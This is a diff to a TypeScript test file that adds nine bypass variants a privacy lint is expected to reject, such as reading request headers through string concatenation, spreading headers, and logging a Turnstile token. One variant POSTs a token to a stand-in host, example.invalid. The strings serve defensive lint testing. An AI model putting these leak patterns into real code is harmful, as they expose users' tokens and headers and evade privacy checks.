@@ -211,6 +211,56 @@ const NEW_VARIANTS: { name: string; file: string; source: string }[] = [
   },
 ];
 
+const ROUND4_VARIANTS: { name: string; file: string; source: string }[] = [
+  {
+    name: "concatenated request headers",
+    file: "mutant-request-head-ers.ts",
+    source: `export function leak(request: Request): unknown { return (request as any)["head" + "ers"]; }`,
+  },
+  {
+    name: "readAllowedHeader function-name exemption",
+    file: "mutant-named-read-allowed.ts",
+    source: `export function readAllowedHeader(request: Request): Headers { return request.headers; }`,
+  },
+  {
+    name: "logJson turnstileToken shorthand",
+    file: "mutant-logjson-token.ts",
+    source: `declare function logJson(value: unknown): void;
+      export function leak(turnstileToken: string): void { logJson({ turnstileToken }); }`,
+  },
+  {
+    name: "Object.fromEntries request headers",
+    file: "mutant-fromentries.ts",
+    source: `export function leak(request: Request): unknown { return Object.fromEntries(request["headers"]); }`,
+  },
+  {
+    name: "spread request headers",
+    file: "mutant-spread-headers.ts",
+    source: `export function leak(request: Request): unknown { return [...request["headers"]]; }`,
+  },
+  {
+    name: "Object.getOwnPropertyDescriptor request",
+    file: "mutant-gopd.ts",
+    source: `export function leak(request: Request): unknown { return Object.getOwnPropertyDescriptor(request, "cf"); }`,
+  },
+  {
+    name: "Object.entries request",
+    file: "mutant-object-entries.ts",
+    source: `declare function logJson(value: unknown): void;
+      export function leak(request: Request): void { logJson(Object.entries(request)); }`,
+  },
+  {
+    name: "fetch exfiltrates token",
+    file: "mutant-fetch-token.ts",
+    source: `export function leak(token: string): Promise<Response> { return fetch("https://example.invalid/", { method: "POST", body: token }); }`,
+  },
+  {
+    name: "token in Error message",
+    file: "mutant-error-token.ts",
+    source: `export function leak(token: string): Error { return new Error(token); }`,
+  },
+];
+
 test("privacy lint rejects the seven older bypass variants", () => {
   for (const variant of OLD_VARIANTS) {
     const errors = lintTypeScript(variant.file, variant.source);
@@ -221,6 +271,14 @@ test("privacy lint rejects the seven older bypass variants", () => {
 test("privacy lint rejects the twenty structural bypass variants", () => {
   assert.equal(NEW_VARIANTS.length, 20);
   for (const variant of NEW_VARIANTS) {
+    const errors = lintTypeScript(variant.file, variant.source);
+    assert.ok(errors.length > 0, `${variant.name} must fail the privacy lint`);
+  }
+});
+
+test("privacy lint rejects the nine remaining bypass variants", () => {
+  assert.equal(ROUND4_VARIANTS.length, 9);
+  for (const variant of ROUND4_VARIANTS) {
     const errors = lintTypeScript(variant.file, variant.source);
     assert.ok(errors.length > 0, `${variant.name} must fail the privacy lint`);
   }
